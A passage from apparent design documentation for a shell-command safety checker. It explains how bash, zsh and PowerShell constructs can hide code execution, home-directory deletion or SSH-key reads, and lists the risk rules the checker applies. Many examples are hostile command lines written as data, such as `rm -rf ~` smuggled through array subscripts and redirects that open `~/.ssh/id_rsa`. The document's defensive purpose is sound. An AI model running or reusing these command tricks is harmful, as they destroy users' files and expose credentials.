  ((…))`, each word of `let` (also behind `builtin` and `command`, and spelled
  `\let` or `'let'`), both sides of `-eq`, `-ne`, `-lt`, `-le`, `-gt` and
  `-ge` in `[[ … ]]` (not in `[ … ]` and `test`, which read numbers only), an
  array's subscript (`${a[i]}`, `a[i]=1`, and the key of each `[k]=v` of an
  indexed array, `a=([k]=v)`; an array declared with `-A` has text keys), the
  offset and length of `${x:i:j}`, `${@:i:j}` and `${1:i}`, and every value
  given to a variable the line gives the integer attribute (`declare -i n`,
  also `local -i`, `typeset -i` and a `declare` behind `builtin` or
  `command`): an assignment, `read`, `printf -v`, `${n:=…}` and the words of
  `for n in …` alike. A name in an expression reads its value; so does `$x`
  in one, `$1` reads the first positional parameter, and `$@` and `$*` read
  them all. A name that is assigned (`(( x = 1 ))`, `let x=1`) is not read,
  `x += 1` is, and `${#x}` is a length that reads no value as code.
- **A subscript in a variable's name** that a builtin reads is arithmetic
  too: `unset 'a[i]'`, `read 'a[i]'`, `printf -v 'a[i]'`, `getopts o 'a[i]'`,
  `declare 'a[i]=1'`, `[[ -v a[i] ]]` and `test -v 'a[i]'`.
- **`${!x}`** reads the variable the value of `x` names, and its subscript as
  arithmetic: `x='a[$(rm -rf ~)]'; echo ${!x}` deletes, and so does
  `x='a[i]'; i='a[$(rm -rf ~)]'; echo ${!x}`. In arithmetic, `${!x}` reads
  the value of each variable the values of `x` name as an expression (`x=y;
  y='a[$(rm -rf ~)]'; echo $(( ${!x} ))`). `${!x@}`, `${!x*}` and `${!a[@]}`
  list names and keys and read no value. A reference (`declare -n r=…`, also
  `local -n` and `typeset -n`, not `export -n`) is read the same way, where
  it is declared: `declare -n r='a[$(rm -rf ~)]'; echo $r` deletes.
- **`${x@P}`** expands the value as a prompt: its escapes decoded as a
  `PS4`'s are (see [Actions that run later](#actions-that-run-later)), then
  its `$(…)` and backticks run. `${!y@P}` does the same to each variable the
  values of `y` name. `${x@Q}`, `${x@U}` and the other operators run nothing.

The values are the ones the line gives, wherever it gives them and whether
or not that runs before the read: an assignment (also after `export`,
`declare`, `local` and the like, quoted or not, an element of an array, and
`+=`), each word of a `for` loop, `${x:=v}`, and the positional parameters
that `set -- …` (or `set` with words after its options) and a call of a
function the line defines give, from `$1` on. A value written in text is
read as the code it holds where the read is, `$(…)`, backticks and `${…}`
(which may itself read another value again), as a nested script whose
findings are the line's: so the lines above are the `delete` of `~`. A value
is followed through the names it holds (`x='a[$(rm -rf ~)]'; y=x; echo
$((y))` deletes too). A value that names no code reads as safe: `x=3; echo
$((x + 1))`, `i=0; echo ${a[i]}`, `n=$((n + 1))` (an arithmetic expansion is
a number) and `for i in 1 2 3; do echo $((i * 2)); done`. So does a value
that is always a number: `$?`, `$#`, `$$`, `$!`, a length (`${#x}`,
`${#a[@]}`), a range of numbers (`for i in {1..5}`), and the counters bash
fills (`$RANDOM`, `$SRANDOM`, `$SECONDS`, `$EPOCHSECONDS`, `$LINENO`,
`$BASHPID`, `$PPID`, `$UID`, `$EUID`) as long as the line names the counter
nowhere but where it reads it: a counter the line unsets or declares is a
variable like any other. So `cargo build; rc=$?; [[ $rc -eq 0 ]]`,
`n=${#arr[@]}; echo $((n-1))` and `x=$RANDOM` stay safe.

A value only known when it runs is `unknown`, with the reason `may run code a
variable holds that is only known when it runs`, at each place that reads it
so: one set from a substitution or another variable (`x=$(cat f)`, `x="$y"`),
by `read`, `mapfile`, `printf -v` or `getopts`, by a `for` over words that
expand or match names (`for x in *`, `for x in $(seq 5)`, `for x; do`), by
`${x:=…}` with a quote or an expansion in its word, and pieces joined by `+=`
when any of them holds a `$` or a backtick (`x='$'; x+='(rm -rf ~)'` is
`$(rm -rf ~)`). So is a word with a backslash before a `$` or a backtick
outside quotes (`x=a[\$\(rm\ -rf\ ~\)]`), which the grammar may read
apart, and every positional parameter once the line shifts them. So is a
variable given more than 16 distinct values, a value that names more than 256
variables, and a read that follows more than 64 names. A variable the line
does not set at all is the environment the caller runs the line in, and is
not judged (`echo $((COLUMNS - 1))` and `echo $(($1))` stay safe).

The output of a command that arithmetic reads is an expression too, so
`$(( $(echo 'a[$(rm -rf ~)]') ))` runs the code the command prints. The
guard cannot know what a program prints, so arithmetic that reads a
substitution is `unknown`, with the reason `may run code in a command's
output that arithmetic reads`, wherever it is: `$(( $(cat f) ))`, `[[ $(id -u)
-eq 0 ]]`, `${a[$(cmd)]}`. This is the price of the rule: some ordinary
lines become `unknown`, such as `start=$(date +%s); make; echo $((
$(date +%s) - start ))` and `[[ $(wc -l < f) -gt 0 ]]`, where the programs
only print numbers. `[ "$(id -u)" -eq 0 ]` reads numbers only and stays
safe.

The tree is read for the values once, before the walk, and the walk reads
them again where each read is. That work is kept out of the frame of the
walk itself, which recurses once for each level of the parse tree, so that a
line nested to the limit (see [What cannot be read is risky](#what-cannot-be-read-is-risky)) still
fits a thread's stack.

Quoted text the grammar keeps as text is read as the shell reads it in two
more places:

- **Single quotes in a `${…}` word inside double quotes** (and in the body of
  a here-document with an unquoted delimiter, which the shell reads the same
  way) are text, so what they hold is expanded: `echo "${x:-'$(rm -rf ~)'}"`
  and `echo "${x/y/'$(rm -rf ~)'}"` delete, and so do a word with text around
  the quotes (`"${x:-a'$(rm -rf ~)'b}"`), an ANSI-C string (`"${x:-$'…'}"`)
  and a nested `${…}`. Outside double quotes they quote: `echo ${x:-'$(rm -rf
  ~)'}` stays safe, as do `echo "${x:-default}"` and `echo "${x:-'a b'}"`. A
  backslash still escapes there, so ``echo "${x:-'\`'}"`` holds a plain
  backtick and stays safe.
- **A backslash inside backticks** before a backtick, a `$` or a backslash
  goes before the code is read, so an escaped backtick starts a substitution
  of its own: ```echo "`echo \`rm -rf ~\``"``` deletes. The code is read as
  the here-document's backticks are (`\"` both ways, bash's and dash's).

### Where a line is

A `cd` (or `pushd`, or `Set-Location`) moves the rest of the line. A later
relative path is judged from where it moved to. A `cd` inside a subshell or a
nested script in a process of its own does not reach the rest of the line;
`eval` runs in this shell, so its `cd` does, and so does the `cd` in a string
PowerShell's `Invoke-Expression` runs (`iex 'cd C:\Windows'`), since the session
has one location; in a pipeline only zsh runs the
last stage in this shell, but, as for a `cd`, any stage counts. Where a `cd` went is
unknown when its target is, and then so is every relative path after it.
A device (`$null`, `NUL`, `NUL:`, `CON`, `/dev/null`) is the same in any folder,
so it is read as written, before the path is joined to where a `cd` moved:
`cd $dir; python x.py > $null` writes nothing, while `> out.txt` stays an
overwrite of a file only known when it runs. `$null` is the device only in
PowerShell, and only as the null value itself. In a POSIX shell it is the variable
`null`, only known when it runs; in cmd, and quoted in PowerShell (`'$null'`), it
is a file name like any other, joined to where the `cd` went.

A redirect on a `cd` (`chdir`, `pushd`, `Set-Location`) is opened before the
command runs, so its file is placed from the folder the command starts in, not
the one it goes to: `cd sub < ../../.ssh/id_rsa` opens the same key `cat
../../.ssh/id_rsa` does (`read_secret`), `cd ../.. < .ssh/id_rsa` reads
`<cwd>/.ssh/id_rsa`, and `cd sub > ../x` writes `<cwd>/../x`. The same holds in
cmd (`cd sub > ..\x.txt`) and for `effect_paths`: `cd x < f` lists `<cwd>/f`.
The redirect of the next command is placed from where the line now is. In a
POSIX shell only a redirect on the command itself is read this way, and that
includes a `cd` after `&&`, `||`, `|` or `!` (`ls && cd sub < ../../.ssh/id_rsa`,
`cd ~ && cd sub < .ssh/id_rsa`: the grammar puts the redirect on the whole list,
and it is read as the last command's). The file a group, a loop, a branch or a
subshell is redirected from is opened before its body runs, so it is placed from
the folder the line is in when that statement begins, not from the one a `cd` in
the body leaves it in. When the statement is the last command of a list (`cd ~
&& { cat; } < .ssh/id_rsa`, `cd ~ && while read l; do …; done < f`), the grammar
puts the redirect on the whole list, but the shell opens it after the commands
before it ran, so "when the statement begins" is after them: the folder and the
count of `cd`s are taken just before that last command, not before the list,
and the redirect is on that last command only (the key above is read from
`~`, and a `send_secret` pipe after it finds it). A `cd` before it that may not
have run (after `||`, or the right side of `&&` or `||`) makes the folder
uncertain, as for a `cd` above. A pipeline's last stage starts where the
pipeline starts (`cd ~ | { cat; } < .ssh/id_rsa` opens it from the folder the
line is in). `{ cd sub; cat; } < ../../.ssh/id_rsa` and `while read
l; do cd sub; done < ../../.ssh/id_rsa` open the same key `cat
../../.ssh/id_rsa` does (`read_secret`), `{ cd sub; ls; } > ../x` writes
`<cwd>/../x`, while `{ cd ../..; cat; } < .ssh/id_rsa` reads `<cwd>/.ssh/id_rsa`
and `{ cd ../..; ls; } > x` writes `<cwd>/x`. When that folder is not certain,
the redirect is placed from every folder that may be it, as for a `cd` above:
where the line is when the statement ends too if the statement is in a loop or
a function body, and where the line began too if an earlier `cd` may not have
moved it. A `cd` in the body that may not have run (in a branch of an `if` or a
`case`, after `&&` or `||` or on the left of `||`, in a loop body, in a pipeline
stage or behind a wrapper) leaves the line in a folder that is not certain. The
redirect itself still opens from where the statement began, but the line may
end there or where the `cd` took it, so a later run of a file it wrote is
judged from both folders, as after any `cd` that may not have run (see "A
script a line writes and then runs" below). `if
false; then cd sub; else echo x; fi > x.sh; bash x.sh`, `{ echo x; false && cd
sub; } > x.sh; bash x.sh` and `for i in $l; do cd sub; echo x; done > x.sh; bash
x.sh` may run the `x.sh` they wrote, when the `cd` did not run, so they are
`unknown`, as the same `cd` at the top level is; but `{
cd sub; echo x; } > x.sh; bash x.sh` surely runs `sub/x.sh` and `if true; then cd
sub; fi > x.sh; bash x.sh` keeps its verdict: an `if` whose condition is `true`
or `:` alone, with no `elif` or `else`, runs its body, so a `cd` in it is not
one that may not have run (unless a function of that name is defined, or the
line has an `alias`, `enable` or `disable`, which can change what the name
stands for). That is all it changes: for the option, a function definition and
where a later `cd` starts it is a branch like any other `if`. After such a
statement a later `cd` moves the line on from both folders: `{ echo x; false &&
cd sub; } > x.sh; cd ..; bash x.sh` may run the `x.sh` it wrote, and so may
`{ false && cd s; } > x0.sh; false && cd t; bash x0.sh`, where each `cd` may
not have run.

A redirect on a call to a function whose body moves the line
(`f() { cd sub; }; f < ../../.ssh/id_rsa`) is opened before the body runs as
well, from the folder the line is in when the function is called. The walk
applies the body's `cd` once, where the function is defined, so it cannot name
that folder after the definition unless nothing has moved the line since: it
places the redirect from the folder the function was defined in and from where
the line is when the redirect is read when no `cd` was read between the
definition and the call, the function was not called before, and the line was
surely where the definition was read. Otherwise (`f() { cd sub; cat; }; cd x; f
< ../../../.ssh/id_rsa`, `f; f < …`, `ls || cd a; f() { …; }; f < …`, a call in
a loop, a call to a function that calls one that moves the line) the folder is
only known when it runs, and the line is `unknown` for a name relative to the
folder; a redirect that names none (`2>&1`, `>&2`, `> /dev/null`, `~/x`) is
placed from where the line is. A `cd` that never reaches the line does not
count as the body moving it: one in a subshell `( … )` or a `$( … )` does not
move the statement (`for d in */; do (cd "$d" && make); done > ../log` opens
`../log` from where the line is). A `cd` behind `command`, `builtin` or `time`,
in any stage of a pipeline (zsh runs the last in this shell), in the background
or behind `env` or `nohup` may or may not reach the line, so the walk counts it
as moving it, and a function with one is a function that moves the line: `f() {
command cd sub; cat; }; f < ../../.ssh/id_rsa`, `f() { cd sub & cat; }; f <
../../.ssh/id_rsa` and `f() { cd sub | cat; }; f; f > log` are read like the
same with a plain `cd`. A redirect placed from the folders of more than a few
dozen functions that move the line, each defined in another folder, is
`unknown`, not judged from each of them. A later definition of a function
that the line surely runs in its own shell replaces the earlier one of the same
name, so a name defined many times is read once, and `unknown` once however
many calls reach it. One that may not run there is kept beside the earlier one,
since the earlier one may be the function a call reaches: the right side of
`&&` or `||`, a branch of `if` or `case`, a loop, a function body, the
background, a subshell `( … )`, a `$( … )` or `<( … )`, a pipeline stage and a
script in a process of its own (`bash -c`). So `f() { :; } > .bashrc; cd ~;
false && f() { cd .; }; f`, `… ; (f() { cd .; }); f` and `… ; f() { cd .; } & f`
are `unknown` and `f() { echo x; } > .bashrc; cd ~; f() { cd .; }; f` is not. A
line that defines more than a few hundred functions that move the line or whose
definition is redirected (a name defined again counts again, kept or replaced)
is `unknown`, and says so once, instead of placed from where each function was
defined. A redirect written on the
definition itself (`f() { cd sub; cat; } < ../../.ssh/id_rsa`) is opened at each
call, before the body, so it is placed like a group's, from the folder the line
is in where the function is defined, not from where the body ends; a name
relative to the folder (not `/dev/null`, `~/x` or `2>&1`) that a call reaches
after a `cd`, a second call of a function that moves the line, a call in a loop
that later moves the line, or from a definition the line may not have reached,
is `unknown` too. In PowerShell only the
redirects of the command itself are placed so: a redirect inside a `$()` in its
arguments is placed from where the line is there, and so is a redirect that
follows an argument that moved the line (`Set-Location $(cd ..\..; 'sub') >
x.txt` writes two folders up, as the session ran the argument before it opened
the file).

The folder a `cd` starts in is not always certain, and the redirect is then
placed from both places, the one the `cd` starts in and the one it goes to, so
either can make the line risky. It is not certain when the `cd` is in a loop
or a function body, which runs again from where the last pass left the line
(`for i in 1 2; do cd .. > x; done` writes `<cwd>/../x` on the second pass;
`f() { cd .. > x; }; f; f`; in PowerShell `foreach`, `ForEach-Object`, `while`,
`for` and `function`), and when an earlier `cd` may not have moved the line: it
ran in a pipeline stage or in the background, on the right of `&&` or `||`, in
a branch of an `if`, `case` or `switch` or a `try`, on the left of `||` (not
one whose right side ends the shell, `cd s || exit`: see "A script a line
writes and then runs" below), or through a wrapper that runs it as a program
or in a shell of its own, such as
`env`, `nohup`, `timeout`, `coproc` or cmd's `start` (`cd sub || cd .. > ../x`,
`if false; then cd sub; fi; cd .. > ../x`, `env cd sub; cd .. > ../x`; the same
in PowerShell and cmd). Only a `cd` after one of those is read this way: a
redirect on a `cd` that follows a plain `cd` and `;` is placed from where the
line is, as before.

In PowerShell, `cd -` and `cd +` go back or forward in location history, so the
place is only known when it runs.

A PowerShell session has one location, whatever scope a block runs in, and
some of what moves it is not a `cd` the line shows. Then the place, and every
relative or rooted path after it, is only known when it runs: a script block or
a script run by a name only known when it runs (`& $b`, `. $b`, `&
(Get-Command f)`; a block written out, `& { … }`, is read where it stands), an
`Invoke-Expression` of a string not written out (`iex $s`, `iex "cd $d"`, a
download), and the process's own folder set by
`[Environment]::CurrentDirectory = …` or `[IO.Directory]::SetCurrentDirectory`,
which a .NET call and a program the session starts may take. A method of
`$ExecutionContext.SessionState.Path` is the cmdlet it stands for, read with
the string it is given: `SetLocation('C:\Windows')` is `Set-Location
C:\Windows`, `PushCurrentLocation`, `PopLocation` and `SetDefaultLocationStack`
the stack steps below. Called on anything else (a variable that may hold the
paths) the place, and the stack, are only known when it runs.

`Set-Location`, `Push-Location` and `Pop-Location` are read by their own
parameters, so the value of `-StackName` is not the folder: `Push-Location
-StackName s C:\Windows` goes to `C:\Windows`. `Push-Location` with no path
saves where the line is and stays there, and `Set-Location -StackName s` only
picks the stack the others use when not given one. The line keeps the folders
`Push-Location` saved, on each stack by name, so a `Pop-Location` goes back to
the last one saved on its stack, and to every other folder the line may have
been in then: `Push-Location src; Pop-Location; Remove-Item -Recurse build`
deletes `<cwd>\build`. Only a step the line is certain to take, in order, is
kept. After one that may not run or may run again (in a branch, a loop, a
function body, on the right of `&&` or `||`, behind a wrapper, or in an action
that runs later), after a block or a script the guard does not read that may
move the line (`& $b`, `iex $s`), which may save or take a folder too, and
after a `Pop-Location` of a stack the line did not fill,
which holds what the session saved before the line, or of a stack only known
when it runs, a `Pop-Location` goes to a place only known when it runs.
The same holds after a location cmdlet in a later stage of a pipeline, which
runs once for each item and may take its folder and its stack from each
(`Import-Csv s.csv | Pop-Location`); after one given an argument that does not
bind (`Pop-Location -WhatIf`, `Pop-Location x`, `Push-Location -Foo x`, an
unknown or ambiguous parameter, a value parameter with no value, more folders
than it takes, or a splat), which stops it before it does anything; and once
the line defines a function or sets an alias named as one of them
(`function Pop-Location { }`, `Set-Alias popd Get-Date`), or an alias whose
name is only known when it runs (`Set-Alias $n …`, `Import-Alias`), which may
stand in for it. A process or a runspace of its own (a job's block, a thread
job's, a `ForEach-Object -Parallel` block, a nested `pwsh -Command`) starts
with empty stacks, so a `Pop-Location` there takes nothing the line saved and
goes to a place only known when it runs (`Push-Location C:\Windows; Start-Job
{ Pop-Location; Remove-Item -Recurse System32 }` deletes
`C:\Windows\System32`), and the line's stacks are as they were after it.

The blocks of `Start-Job` run in a process of their own, so a `cd` in them does
not move the line. They start in its `-WorkingDirectory`, joined to where the
line is (`Start-Job -WorkingDirectory ~ { Remove-Item -Recurse .\build }` deletes
`~\build`), and where the line is when it names none, as PowerShell 7 starts
them; Windows PowerShell 5.1 starts such a job in `~\Documents`, which the guard
does not read. They are read after the
rest of the command, whose arguments and redirects the session runs before the
job starts. When a job has more than one block and one of them moves, which
runs first (`-InitializationScript` runs before the block, wherever it is
written) is not read, and every path in them is only known when it runs.

In a POSIX shell `pushd` has options before its folder, as `cd` has, and none
of them is the folder: `-L` and `-P` are skipped (`pushd -P ~/.ssh && cat
id_rsa` reads `~/.ssh/id_rsa`, a secret, like `cd -P ~/.ssh`), and `-n` changes
the stack of folders without moving, so `pushd -n ~/.ssh && cat id_rsa` reads
`<cwd>/id_rsa` and lists no option as a path. `--` ends the options. Where a
`pushd` goes is only known when it runs when it has no folder (`pushd` alone
swaps the top of the stack), a stack index (`+1`, `-1`), `-` (the folder
before), a word only known when the line runs before the folder, or an option
the guard does not know (`-q`, `--help`): every relative path after it is
unknown too.

In PowerShell a bare `NUL` or `CON` is the device only on the file system.
After a `cd` to the registry, `Env:`, `Variable:`, `Function:` or `Cert:`, or to
a place only known when it runs (it may be a registry key), it is an ordinary
item name there, so deleting, moving or changing it (`Remove-Item NUL`,
`Move-Item NUL x`, `Set-ItemProperty NUL`, `New-Item NUL`) changes the item of
that name, and a bare name is joined to where the `cd` went like any other.
Writes by a file system path (`> NUL`, `Out-File NUL`, `Tee-Object NUL`,
`Invoke-WebRequest -OutFile NUL`) fail in such a provider and stay harmless.
`Set-Content`, `Add-Content` and `Clear-Content` do not: the `Env:`,
`Variable:`, `Function:` and `Alias:` providers take content, so
`cd Function:; Set-Content NUL ...; NUL` defines and runs a function named `NUL`,
and they are judged as an item of the folder like a delete. So is the
destination of `Copy-Item` and `Move-Item`, which in the registry is a key.
A `$null` destination of those is no destination, so the item goes to the
folder the line is in. So does a `$null` or missing path of `New-Item` (with
`-Name` the path is optional). With `-Name` the item is `Path\Name`, judged as
that one path, so a `..` in the name is applied and a device path (`NUL`, `CON`)
is never the item itself. `$null` is the null value in any provider.

In PowerShell a rooted path with no drive (`\x`, `/x`, as in `cd \`) is on the
drive or share of the folder before it, so after `cd HKCU:\Software\Foo` it is
`HKCU:\x`, after `cd Function:` it is `Function:\x`, and after `cd
\\server\share\x` it is `\\server\share\x` (`\\?\UNC\server\share\x` and
`\\?\C:\x` are read for the share and the drive they name; another `\\?\` or
`\\.\` folder has no root the guard reads, so the path is only known when it
runs); it is on the file system only when the folder before it is (a disk, a
share, or no earlier `cd` at all).
When that folder is only known when it runs, or is a provider path with no drive (`Registry::HKEY_CURRENT_USER\...`),
so is the rooted path. `~` is the home of the provider the folder is in, and
only the file system has one: after a `cd` to the registry, `Function:`, a
provider path, or a place only known when it runs, `cd ~` fails and the line
stays where it was, so a path starting with `~` is only known when it runs, and
so is a `cd` with no path. A `Set-Location` or `Push-Location` that is not the
first stage of its pipeline gets its path from the pipeline, not from home. A
drive's name may hold any character but `/ \ . ~`, a separator and a wildcard (`my_reg:`), so any such
name before a colon, other than one letter, is a drive that is not a disk. Once
the line makes a drive (`New-PSDrive`, `ndr`, `mount`), anywhere in its text,
even after the `cd` (a function body, a loop), a single letter in a `cd`
(`cd X:`) may be that drive and not a disk, so the place is only known when it
runs. Without one, a letter is a disk.
After a `cd` to a known place on the file system, the device is read as
written for every command. cmd and POSIX have no other provider.

A variable that names a place (`$HOME`, `%TEMP%`, `$env:TEMP`) stops naming it
once the line sets it anywhere: `TMPDIR=$HOME`, `set TEMP=...`, `unset HOME`.

### Hidden names

A POSIX wildcard skips a name that starts with a dot, so `rm -rf *git` leaves
`.git` alone. A line can switch that off, and then `*git` takes `.git`: bash's
`shopt -s dotglob`, zsh's `setopt globdots` (also spelled `dotglob`),
`set -o globdots`, and a non-empty `GLOBIGNORE` (bash turns `dotglob` on for
it). Once a POSIX line has turned one on, every later pattern in that shell is
judged as core judges a PowerShell or cmd wildcard: it can match a leading dot
(see [Core](core.md)). Each unit and each redirect carries the flag, like the
folder a `cd` moved to.

- **On.** `shopt -s dotglob` (also with `nullglob` and the like, `-sq`);
  zsh's `setopt globdots`, `GLOB_DOTS`, `glob_dots`, `dotglob` and `DOT_GLOB`
  (zsh ignores case and underscores), `unsetopt noglobdots` and `unsetopt
  nodotglob`; `set -o globdots`, `set -o dotglob`; zsh's flag `-4` for
  `set` and `setopt` (`+4` undoes it); `setopt -m` and `unsetopt -m` with any
  pattern, which may name it. An option name or flag only known when it runs
  counts as on.
- **`GLOBIGNORE`** turns it on when it is not empty: as `GLOBIGNORE=x` on a
  line of its own, after `export`, `declare`, `typeset`, `local` or `readonly`
  (quoted too: `export "GLOBIGNORE=x"`), with `+=`, as `let GLOBIGNORE=1` or
  `(( GLOBIGNORE=1 ))`, `(( GLOBIGNORE++ ))` (also `--` and in front, and
  `+=` and the like), `(( x = GLOBIGNORE = 1 ))` (anywhere in a chain of
  assignments, however the parse nests it), `let` reading its words as `(( ))` does (`let
  GLOBIGNORE++`, `let ++GLOBIGNORE`, `let GLOBIGNORE+=1`, `let
  "GLOBIGNORE+=1"`, in any comma-separated part or value of a word), as
  `read GLOBIGNORE` or `printf -v GLOBIGNORE`, as a `for` variable, or by an
  expansion that assigns it: `: ${GLOBIGNORE:=x}`, `${GLOBIGNORE=x}`,
  `${GLOBIGNORE[0]:=x}`, anywhere a word is expanded (an argument, an
  assignment's value, inside quotes). Whether the variable was already set is
  not known, so the assignment counts as made; `${GLOBIGNORE:=}` assigns
  nothing that matters and `${GLOBIGNORE:-x}` and `${GLOBIGNORE:+x}` do not
  assign. A command expands its words before its wildcards, so `rm -rf
  ${GLOBIGNORE:=x}*git` is judged with the option on. An empty value turns
  nothing on. A command with
  `GLOBIGNORE=x` in front of it, or after `env`, was expanded by the shell
  before the variable applies, so only a script it starts (`GLOBIGNORE=x bash
  -c '…'`) is judged with it on. `BASHOPTS=dotglob` does the same for the bash
  it starts; as a statement it counts as on.
- **zsh's `(D)` glob qualifier** lets the patterns of one command match hidden
  names without any option: `rm -rf *git(D)`. The grammar cannot read a
  qualifier, so before the line is parsed each one is taken out of its word
  (`*git(D)` becomes `*git`) and its place kept; a command with a word that
  had one is judged with hidden names matching, and so is a redirect target
  that had one, a `for` list (the loop's body), and, through a listing, the
  command it feeds. It is the command's alone: `rm -rf *.o(D); rm -rf *git`
  is still safe. A command that turns its words into a script (`eval rm -rf
  *git(D)`, `watch rm -rf *git(D)`, `trap rm\ -rf\ *git(D) EXIT`) keeps it for
  the commands that script holds: the shell expanded the pattern first, so the
  `rm` inside is handed `.git`. A word is read as having one when a `(…)` ends it (the next
  character is a space, `;`, `&`, `|`, `<`, `>` or `)`), the character in
  front is not what makes `$(`, `<(`, `>(`, `((`, `a=(`, `+(`, `@(` or `!(`, the
  `(` is not inside quotes, and what is inside holds `D` and nothing but
  letters other than `e` and `P`, digits, and `.^/@=%*,-` (`(D)`, `(.D)`,
  `(D/)`, `(^D)`, `(mh-1D)`). A qualifier with `e` (runs a string), `+` (runs
  a function), `P` (adds the string it holds as an extra word before each
  match: `*(DP./usr.)` is `/usr` and every name), `:`, `[`, or a substitution
  is not taken out and stays unreadable as before, and so does one without `D`
  (`*.o(N)`), which says nothing about hidden names. So does a qualifier on a
  word that holds `^`, `#` or a `~` that does not start it: with `extendedglob`
  (an rc file may set it) `^x(D)`, `*git~x(D)` and `.#git(D)` match `.git`, and
  the word cannot be read as a plain pattern. Where hidden names match, `**/`
  and `***/` also stand for no folder, so `**/*git(D)` is read as `*git(D)` too,
  which reaches `.git` of the workspace folder (so does `**/*git` with
  `dotglob` and `globstar`). `bash -c 'rm -rf *git(D)'` and the rest read the qualifier in
  the script, where it is not inside quotes.
- **A shell's own start-up options** turn it on for the script that shell runs:
  `bash -O dotglob -c '…'`, `zsh -o globdots -c '…'`, `zsh -o dotglob`, `zsh -4`,
  `zsh --globdots`, and a name only known when it runs.
- **`source` and `.`** run a file the guard cannot read, which may turn it on,
  so a line that sources one is judged with it on afterwards.
- **Two flags.** The guard keeps bash's option and zsh's apart, and hidden
  names match when either is on. Bash's is turned on by `shopt -s`,
  `GLOBIGNORE` and `BASHOPTS`, and off by `shopt -u` and `unset GLOBIGNORE`
  (`unset -f GLOBIGNORE` removes a function and changes nothing). zsh's is
  turned on by `setopt`, `unsetopt no…`, `set -o globdots` or `dotglob`, and
  `-4`, and off by their opposites. `source`, a shell started with the option
  on, and a name only known when it runs turn both on. An off switch clears only
  its own flag, since in the other shell it is an error: `setopt globdots;
  shopt -u dotglob; rm -rf *git` and `shopt -s dotglob; unsetopt globdots; rm
  -rf *git` are still risky.
- **Off.** `shopt -u dotglob`, `unsetopt globdots`, `set +o globdots` and
  `unset GLOBIGNORE` turn their flag off, but only where the line is sure to run
  them in this shell. They count when the unit is reached directly or through
  `command`, `builtin`, `time`, `!` or `eval`, except that zsh's `command` does
  not count for zsh's flag (it looks up programs only) and `time` counts only
  in front (later it is the program of that name). zsh's `noglob`, `nocorrect` and
  `-` count for zsh's flag only: in bash and sh they are not found and the
  builtin after them never runs, so `shopt -s dotglob; noglob shopt -u dotglob;
  rm -rf *git` is still risky and `setopt globdots; noglob unsetopt globdots;
  rm -rf *git` is not. `nocorrect` is a reserved word in zsh, so like `time` it
  counts only in front, alone or after a leading `time` or `nocorrect`; after
  `noglob`, `-` or `builtin` zsh looks it up as a command and fails, so
  `setopt globdots; noglob nocorrect unsetopt globdots; rm -rf *git` is still
  risky. Behind `env`, `nohup`, `timeout`, `nice`, `stdbuf`,
  `sudo` or `find -exec` they run in a process of their own and change nothing.
  In a pipeline, after `&`, on the right of `&&` or `||`, in an `if`, `case`,
  loop or function body, they change nothing either: the line may not run them,
  or runs them in a subshell, so the rest stays judged with the option on.
- **Where it reaches.** It stays on for the rest of the line. A subshell,
  `$(…)`, and a script in a process of its own (`bash -c '…'`) give it back as
  it was: an option set inside `bash -c 'shopt -s dotglob'` does not reach the
  units after it. A script started while it is on inherits it, since an
  exported `GLOBIGNORE` would reach it. `eval` runs in this shell, so its change
  stays, except that an `eval` that is a stage of a pipeline runs in a subshell
  and can turn the option on but not off. An on switch in any pipeline stage
  reaches the units after it, which is conservative: zsh runs the last stage in
  the current shell, so `setopt globdots | cat; rm -rf *git` is risky.
- **Bodies.** A function body or a loop may run after the option is on, whenever
  it is called or comes round again. The guard records the units and redirects
  in them, and after the whole line is read, if the line ever turned the option
  on (anywhere, a script it ran included, even if it turned it off again), it
  judges them with it on: `f() { rm -rf *git; }; eval 'shopt -s dotglob'; f`.
  A script started with the option on (`bash -O dotglob -c f`, `GLOBIGNORE=x
  bash -c f`) counts, since the line may have exported a function to it, and so
  does a `GLOBIGNORE=x` in front of a call to a function the line defines
  (`GLOBIGNORE=x f`), which sets it while the body runs. A
  line that never turns it on is not changed by a body that only mentions the
  name (`echo dotglob`).
- **Listings.** A listing hands its pattern on with the flag it was written
  under, so `shopt -s dotglob; ls -d *git | xargs rm -rf` is the delete of
  `*git` with hidden names matching.

Not read, so the caller has to account for them: an option set by `~/.zshenv`
or `~/.bashrc`, a `BASH_ENV` file, an inherited `GLOBIGNORE` or `BASHOPTS`
from the environment the guard's caller runs in.

## The rules

A rule reads a unit's program, its flags, its operands and its redirects. It
never reads the raw text. `echo "rm -rf /"` is safe, because the program is
`echo`.

| Wire name | What it finds |
| --- | --- |
| `delete` | Deletes files beyond the workspace, the workspace itself, a sensitive or protected file, or a path known only when it runs; archives such files with an option that deletes what it archives. |
| `wipe_disk` | Formats, repartitions or writes over a disk. |
| `overwrite` | Writes into a file beyond the workspace, or a sensitive or protected one, or one a tool runs on its own; unpacks an archive into such a folder. |
| `git_discard` | Throws away work git cannot give back: uncommitted changes, untracked files, stashes, unmerged branches, tags, a submodule's changes. |
| `git_remote` | Rewrites or deletes branches on a remote. |
| `git_history` | Rewrites the repository's history, or what git keeps to recover it. |
| `permissions` | Changes permissions or ownership beyond the workspace or of a protected file, or opens files to everyone. |
| `system_settings` | Changes how the system runs: the registry, boot settings, restore points, accounts, the firewall, antivirus, script policy; on macOS and Linux also security switches, services the system runs, Time Machine backups and machine-wide preferences ([below](#machine-settings-on-macos-and-linux)). |
| `read_secret` | Reads a key or a credential: a file a program opens, or a `<` redirect, that lands on a place core marks as holding one; also a disk, and what the kernel serves. See [Reading a key](#reading-a-key). |
| `elevated` | Runs as root or administrator. |
| `run_downloaded` | Runs a script it downloads, through a pipe or `Invoke-Expression`. |
| `run_input` | Runs commands read from its input (a pipe, a here-document), which the line does not show. |
| `stop_system` | Shuts the computer down, restarts it, or stops every process, or one the system needs: a stop whose target the guard reads for sure. |
| `stop_unknown` | Stops processes the guard cannot name for sure: an id or a name only known when it runs, a listing, a substitution, a filter or an object it does not follow. It may be any process, the system's included. |
| `send_secret` | Sends a key, a credential or the environment off the machine. |
| `drop_data` | Deletes data in a database, or runs database statements the line does not show (a file, a stage it does not read). |
| `destroy_resources` | Deletes containers, cluster objects, cloud resources, a hosted repository or an infrastructure stack. |
| `unknown` | Runs a program or a script known only when it runs. |
| `unreadable` | The line, or part of it, cannot be read. |

The wire names never change. A reason is a few plain words that follow from
the rule: `deletes your home directory`, `runs code the guard does not read`.

### Stopping processes by name

`killall`, `pkill`, `taskkill` and `Stop-Process` (also `kill`, `spps`) are
judged one way. Stopping a process by a plain name is everyday work (your own
dev server, `killall Finder`) and is safe: `killall node` and `pkill node` are
